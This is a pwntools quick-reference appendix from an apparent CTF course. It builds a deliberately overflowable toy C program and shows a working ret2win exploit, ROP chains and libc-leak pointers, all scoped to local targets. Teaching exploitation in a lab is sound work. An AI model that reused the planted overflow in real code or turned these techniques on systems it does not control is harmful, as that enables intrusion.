# Appendix B — pwntools Quick Reference

[pwntools](https://docs.pwntools.com/) is the Swiss-army knife of exploit scripting: tubes that talk to
processes and sockets, address packing, ELF/libc parsing, ROP chain building, cyclic patterns, and
helpers for everything between. This appendix is the "what's the call again?" reference; the teaching is
in [Chapter 3](03-talking-to-services.md) (tubes) and [Chapter 11](11-pwn.md) (binary exploitation).

Verified against **pwntools 4.15.0** on Python 3.10 — the version pinned in `requirements.txt`. Import
everything with `from pwn import *` in a script, or named imports as shown.

> **Scope.** Every `remote()` and `process()` in this course targets your **own** local binary or a
> `127.0.0.1` container. Never point a tube at infrastructure you do not control. See
> [Chapter 1](01-getting-started.md) and [Appendix D](appendix-d-running-challenges.md).

The examples that need a binary use this toy program, built once with
`gcc -fno-stack-protector -no-pie -o demo demo.c`:

```c
#include <stdio.h>
#include <unistd.h>
void win(void) { puts("you win"); }
int main(void) {
    char buf[32];
    puts("echo server");
    read(0, buf, 200);     // overflow: reads 200 into a 32-byte buffer
    puts(buf);
    return 0;
}
```

## context — set the target once

`context` holds global defaults (word size, endianness, logging) that `p64`, `flat`, `cyclic`, `shellcraft`
and the tubes all read.

```python
from pwn import context
context.arch = "amd64"        # also: "i386", "arm", ...; sets word size + endianness
context.log_level = "error"   # silence tube chatter ("debug" shows every byte)
context.binary = "demo"       # load an ELF and inherit its arch/bits automatically
print(context.arch, context.bits, context.endian)
```

```text
amd64 64 little
```

Other useful knobs: `context.timeout` (default tube timeout), `context.terminal`
(how `gdb.attach` opens a window), `context.newline`.

## Packing: p8/p16/p32/p64 and friends

```python
from pwn import context, p64, u64, p32, u32, pack, unpack, flat, fit
context.arch = "amd64"
print(p64(0xdeadbeef).hex())
print(hex(u64(b"\x00\x40\x11\x00\x00\x00\x00\x00")))
print(p32(0x41424344).hex())
print(pack(0xdeadbeef, 64).hex())          # generic: pack to N bits
print(hex(unpack(b"\xef\xbe\xad\xde", 32)))
print(flat(b"A" * 8, 0xcafebabe, b"BB").hex())    # mix bytes + ints in order
print(flat({32: 0xdeadbeef}, length=48).hex())    # place a value at offset 32, pad to 48
print(fit({0: b"HEAD", 8: 0xcafe}, length=16).hex())   # fit == flat with a dict
```

```text
efbeadde00000000
0x114000
44434241
efbeadde00000000
0xdeadbeef
4141414141414141bebafeca000000004242
6161616162616161636161616461616165616161666161616761616168616161efbeadde000000006b6161616c616161
4845414462616161feca000000000000
```

`u64` pads a short leak with NULs for you, so `u64(leak.ljust(8, b"\x00"))` is rarely needed.
`flat`/`fit` with a dict fills gaps with a cyclic pattern — handy before you've pinned the offset.

## cyclic — find the overflow offset

```python
from pwn import cyclic, cyclic_find, context
context.arch = "amd64"
pat = cyclic(32)
print(pat)
print(cyclic_find(b"laaa"))     # the 4 bytes that landed in EIP/part of RIP
print(cyclic_find(pat[16:20]))  # -> 16
```

```text
b'aaaabaaacaaadaaaeaaafaaagaaahaaa'
44
16
```

Workflow: send `cyclic(200)`, let it crash, read the saved return address off the stack (in `gdb`, or
from the faulting address), then `cyclic_find(that_value)` is your padding length. For 64-bit use
`cyclic(200, n=8)` / `cyclic_find(x, n=8)` so windows are 8 bytes wide.

## Tubes: process, remote, and the I/O verbs

A *tube* is a bidirectional byte stream. `process` spawns a local binary; `remote` opens a TCP
connection (to your own container only). Both share the same methods.

```python
from pwn import process, context
context.log_level = "error"
p = process("./demo")
p.recvline()                 # b"echo server\n"
p.sendline(b"hello")         # send + newline
print(p.recvline().strip())  # the echoed line
p.close()
```

```text
b'hello'
```

Core verbs (identical on `process` and `remote`):

| Method | Does |
|--------|------|
| `recv(n)` | up to `n` bytes |
| `recvline()` | one line, including the `\n` |
| `recvuntil(delim)` | read through `delim` (wait for a prompt) |
| `recvall(timeout=t)` | everything until EOF |
| `recvregex(r)` | read until a regex matches (grab a leaked address) |
| `send(data)` / `sendline(data)` | write raw / write + `\n` |
| `sendlineafter(delim, data)` | `recvuntil(delim)` then `sendline(data)` |
| `interactive()` | hand the tube to your keyboard (drop into a shell) |
| `clean()` / `close()` | drain / shut down |

`remote` is the same object for a networked target:

```python
from pwn import remote
io = remote("127.0.0.1", 1337)    # your own local container ONLY
io.sendlineafter(b"> ", b"payload")
io.interactive()
```

## End-to-end: ret2win on the toy binary

Putting tubes, packing, and the ELF together — overflow the 32-byte buffer (40 bytes to the saved RIP:
32 buffer + 8 saved RBP), add a bare `ret` for stack alignment, then jump to `win`.

```python
from pwn import process, ELF, context, p64
context.log_level = "error"
e = ELF("demo")
ret = 0x40101a                 # a 'ret' gadget (see ROP, below)
payload = b"A" * 40 + p64(ret) + p64(e.symbols["win"])
p = process("./demo")
p.recvline()
p.sendline(payload)
print(b"you win" in p.recvall(timeout=2))
p.close()
```

```text
True
```

## ELF — symbols, GOT/PLT, and search

```python
from pwn import ELF, context
context.log_level = "error"
e = ELF("demo")
print("win    ", hex(e.symbols["win"]))
print("main   ", hex(e.symbols["main"]))
print("plt puts", hex(e.plt["puts"]))
print("got puts", hex(e.got["puts"]))
print("arch/bits/pie", e.arch, e.bits, e.pie)
print("string 'echo' at", hex(next(e.search(b"echo server"))))
```

```text
win     0x401156
main    0x401170
plt puts 0x401054
got puts 0x404018
arch/bits/pie amd64 64 False
```

Loading an `ELF` also prints a `checksec` report — the mitigations you are up against:

```python
ELF("demo")
```

```text
[*] '/.../demo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

For a PIE binary, `e.address = leak - e.symbols["known"]` sets the base and every later
`e.symbols[...]` becomes a real runtime address. The same pattern on a libc ELF turns one leak into
`system`/`/bin/sh` — see [`ctfkit.pwn.libc_base`](appendix-c-ctfkit-reference.md) for the arithmetic.

## ROP — build a chain

```python
from pwn import ELF, ROP, context
context.arch = "amd64"; context.log_level = "error"
e = ELF("demo")
rop = ROP(e)
rop.call(e.symbols["win"])          # or rop.win(), rop.raw(gadget), rop.ret
print(rop.dump())
print(rop.chain().hex())
g = rop.find_gadget(["ret"])
print("ret gadget:", hex(g.address))
```

```text
0x0000:         0x401156 0x401156()
5611400000000000
ret gadget: 0x40101a
```

`ROP(e).call("puts", [e.got["puts"]])` leaks an address; `rop.find_gadget(["pop rdi", "ret"])` gives the
classic argument-loading gadget. With a libc ELF added to the `ROP([e, libc])` list, pwntools resolves
`system`, `/bin/sh`, and gadgets across both.

## util — the small helpers

```python
from pwn import xor, enhex, unhex, group, bits, unbits
print(xor(b"hello", b"\x10"))        # XOR against a repeating key
print(xor(b"ABC", b"abc").hex())
print(enhex(b"hi"), unhex("6869"))
print(list(group(2, b"abcdef")))     # fixed-size chunks
print(bits(b"A"))                    # byte -> bit list (MSB first)
print(unbits([0,1,0,0,0,0,0,1]))     # bits -> bytes
```

```text
b'xu||\x7f'
202020
6869 b'hi'
[b'ab', b'cd', b'ef']
[0, 1, 0, 0, 0, 0, 0, 1]
b'A'
```

Also worth knowing: `pwn.cyclic_metasploit`, `pwn.more` (pager), `pwn.hexdump`, `pwn.pause`, and
`pwn.log.info/success/warning` for readable script output.

## gdb.attach — debug a live tube

`gdb.attach` opens a debugger on a running `process` (it needs a terminal, so it does not run inside the
checkpoint scripts — use it interactively).

```python
from pwn import process, gdb, context
context.terminal = ["tmux", "splitw", "-h"]   # or ["x-terminal-emulator", "-e"]
p = process("./demo")
gdb.attach(p, gdbscript="""
break *main+42
continue
""")
p.sendline(b"A" * 40)
p.interactive()
```

Or launch under the debugger from the start with `p = gdb.debug("./demo", gdbscript="b main\nc")`.
Install [pwndbg](https://github.com/pwndbg/pwndbg) or GEF for a far richer view
(`telescope`, `vmmap`, `search`). To find the padding without a debugger, send `cyclic(200)` and feed
the recovered return value to `cyclic_find` (above).

## See also

- [Appendix A — Python-for-CTF Cheat Sheet](appendix-a-python-ctf-cheatsheet.md) for the stdlib `struct`/int packing behind `p64`.
- [Appendix C — `ctfkit` API Reference](appendix-c-ctfkit-reference.md): `ctfkit.io` wraps tubes; `ctfkit.pwn` wraps cyclic/packing/leak math.
- [Chapter 11 — Binary Exploitation with Python and pwntools](11-pwn.md) builds these into full solves.

Sources for this appendix: [REFERENCES.md](REFERENCES.md#appendix-b--pwntools-quick-reference)
